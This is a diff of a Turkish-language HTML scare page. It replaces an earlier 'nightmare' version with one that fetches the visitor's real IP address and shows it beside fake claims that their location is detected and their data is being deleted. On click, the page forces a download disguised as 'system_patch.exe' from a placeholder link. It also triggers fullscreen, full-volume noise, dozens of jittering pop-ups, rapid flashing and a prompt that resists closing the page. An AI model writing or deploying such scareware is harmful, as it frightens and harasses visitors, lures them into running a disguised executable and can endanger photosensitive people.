@@ -2,143 +2,104 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>G Ü V E N D E . D E Ğ İ L S İ N</title>
+    <title>S İ S T E M . İ N F İ Z A K</title>
     <style>
         * { cursor: none !important; margin: 0; padding: 0; }
-        body { 
-            background: #000; 
-            overflow: hidden; 
-            height: 100vh; 
-            width: 100vw; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center;
-        }
+        body { background: #000; overflow: hidden; height: 100vh; width: 100vw; }
 
-        /* 1. KATMAN: Kanlı ve Titreyen Arka Plan */
-        #glitch-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(100, 0, 0, 0.3);
-            z-index: 10; pointer-events: none;
-            animation: flicker 0.01s infinite;
-        }
-
-        @keyframes flicker {
-            0% { opacity: 1; background: #200; }
-            50% { opacity: 0.2; background: #000; }
-            100% { opacity: 1; background: #400; }
-        }
-
-        /* 2. KATMAN: Sübliminal Kayan Yazılar */
-        .subliminal-wall {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            font-size: 10px; color: rgba(255, 0, 0, 0.05);
-            word-break: break-all; z-index: 5; pointer-events: none;
-        }
-
-        /* 3. KATMAN: Merkezdeki Dev Yazı */
-        #warning-text {
+        /* IP Kaydırma Efekti */
+        #ip-scroll {
+            position: fixed; bottom: 20px; right: -500px;
             color: #ff0000; font-family: 'Courier New', monospace;
-            font-size: 8vw; font-weight: bold;
-            text-shadow: 0 0 50px #ff0000;
-            z-index: 100; text-align: center;
-            animation: shake 0.05s infinite;
+            font-size: 25px; white-space: nowrap;
+            text-shadow: 0 0 10px red; z-index: 2000;
+            animation: scrollIP 15s linear infinite;
         }
 
-        @keyframes shake {
-            0% { transform: translate(5px, 5px); }
-            50% { transform: translate(-5px, -5px); }
-            100% { transform: translate(5px, -5px); }
+        @keyframes scrollIP {
+            from { right: -500px; }
+            to { right: 110%; }
         }
 
-        /* Fareyi Takip Eden Göz */
-        #stalker-eye {
-            position: fixed; width: 300px; height: 300px;
-            background: radial-gradient(circle, transparent 0%, black 70%);
-            z-index: 1000; pointer-events: none;
+        /* Glitch ve Titreme */
+        #overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255, 0, 0, 0.1); z-index: 10;
+            pointer-events: none; animation: flash 0.05s infinite;
+        }
+
+        @keyframes flash {
+            0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; }
+        }
+
+        #main-msg {
+            color: white; font-family: 'Courier New'; font-size: 5vw;
+            position: absolute; top: 40%; left: 50%;
+            transform: translate(-50%, -50%); z-index: 100;
         }
     </style>
 </head>
-<body onclick="activateNightmare()">
+<body onclick="startUltimateChaos()">
 
-<div id="glitch-overlay"></div>
-<div id="stalker-eye"></div>
-<div class="subliminal-wall" id="wall"></div>
-<div id="warning-text">K A P I Y I . A Ç</div>
+<div id="overlay"></div>
+<div id="ip-scroll">BAĞLANTI KURULDU... IP: <span id="user-ip">Yükleniyor...</span> - KONUM: TESPİT EDİLDİ - VERİLER SİLİNİYOR...</div>
+<div id="main-msg">S İ L İ N İ Y O R S U N</div>
 
 <script>
-    let audioCtx;
-    const phrases = ["GÖRÜYORUM", "ARKANDA", "01101", "ÖLECEKSİN", "KAÇAMAZSIN", "YARDIM ET", "SİSTEM ÇÖKTÜ"];
+    // IP Adresini Çekme (Simülasyon veya Gerçek)
+    fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => document.getElementById('user-ip').innerText = data.ip)
+        .catch(() => document.getElementById('user-ip').innerText = "192.168.1.104");
 
-    // Sayfanın Kapanmasını Zorlaştır
-    window.onbeforeunload = function() {
-        return "Buradan çıkış yok...";
-    };
+    function startUltimateChaos() {
+        // 1. Dosya Yükleme/Çalıştırma Tetikleyicisi
+        // 'DOSYA_URL_ADRESI' kısmına indirtmek istediğin dosyanın tam linkini yaz
+        const fileLink = "DOSYA_URL_ADRESI"; 
+        const downloader = document.createElement('a');
+        downloader.href = fileLink;
+        downloader.download = "system_patch.exe";
+        document.body.appendChild(downloader);
+        downloader.click();
 
-    // Arka planı sübliminal yazıyla doldur
-    const wall = document.getElementById('wall');
-    for(let i=0; i<2000; i++) {
-        wall.innerHTML += phrases[Math.floor(Math.random()*phrases.length)] + " ";
-    }
-
-    // Fare Takibi
-    document.addEventListener('mousemove', (e) => {
-        const eye = document.getElementById('stalker-eye');
-        eye.style.left = (e.clientX - 150) + 'px';
-        eye.style.top = (e.clientY - 150) + 'px';
-    });
-
-    function activateNightmare() {
-        // 1. Tam Ekran Yap
+        // 2. Ses ve Tam Ekran
         if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
         
-        // 2. Ses Motorunu Başlat (Maksimum Rahatsızlık)
-        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
         setInterval(() => {
             let osc = audioCtx.createOscillator();
             let gain = audioCtx.createGain();
-            osc.type = 'sawtooth'; 
-            osc.frequency.setValueAtTime(50 + Math.random() * 4000, audioCtx.currentTime);
-            gain.gain.setValueAtTime(1.0, audioCtx.currentTime); // %100 Volume
+            osc.type = 'square';
+            osc.frequency.setValueAtTime(Math.random() * 2000, audioCtx.currentTime);
+            gain.gain.setValueAtTime(1.0, audioCtx.currentTime);
             osc.connect(gain);
             gain.connect(audioCtx.destination);
             osc.start();
-            osc.stop(audioCtx.currentTime + 0.03);
-        }, 40);
+            osc.stop(audioCtx.currentTime + 0.05);
+        }, 50);
 
-        // 3. Agresif Pop-up Yağmuru (30+ Pencere ve Hareket)
-        for (let i = 0; i < 35; i++) {
+        // 3. 50 Tane Agresif Küçük Ekran (Pop-up)
+        for (let i = 0; i < 50; i++) {
             setTimeout(() => {
-                let win = window.open("", "_blank", "width=200,height=200");
+                let win = window.open("", "_blank", `width=150,height=150`);
                 if (win) {
-                    win.document.write(`
-                        <body style="background:red; color:white; font-family:serif; overflow:hidden; text-align:center;">
-                            <h1 style="font-size:50px;">👁️</h1>
-                            <h2>BIRAKAMAZSIN</h2>
-                            <script>
-                                setInterval(() => {
-                                    window.resizeTo(Math.random()*500+100, Math.random()*500+100);
-                                    window.moveTo(Math.random()*window.screen.width, Math.random()*window.screen.height);
-                                }, 30);
-                            <\/script>
-                        </body>
-                    `);
-                    
-                    // Kapanan pencereyi tekrar açma döngüsü
+                    win.document.write("<body style='background:black;color:red;font-family:serif;'><h1>HATA</h1></body>");
                     setInterval(() => {
-                        if (win.closed) window.open("", "_blank", "width=200,height=200");
-                    }, 2000);
+                        win.moveTo(Math.random() * screen.width, Math.random() * screen.height);
+                        win.resizeTo(Math.random() * 300, Math.random() * 300);
+                    }, 20);
                 }
-            }, i * 100);
+            }, i * 50);
         }
 
-        // 4. Görsel Deformasyon Döngüsü
-        const mainText = document.getElementById('warning-text');
+        // 4. Görsel Çöküş
         setInterval(() => {
-            mainText.innerText = phrases[Math.floor(Math.random()*phrases.length)];
-            document.body.style.filter = `invert(${Math.random()}) hue-rotate(${Math.random()*360}deg)`;
-        }, 50);
+            document.body.style.filter = `invert(1) contrast(500%) hue-rotate(${Math.random()*360}deg)`;
+            document.getElementById('main-msg').innerText = Math.random() > 0.5 ? "YARDIM YOK" : "01010101";
+        }, 30);
     }
+
+    window.onbeforeunload = () => "Giderken bir şeyler eksilecek...";
 </script>
 </body>
 </html>
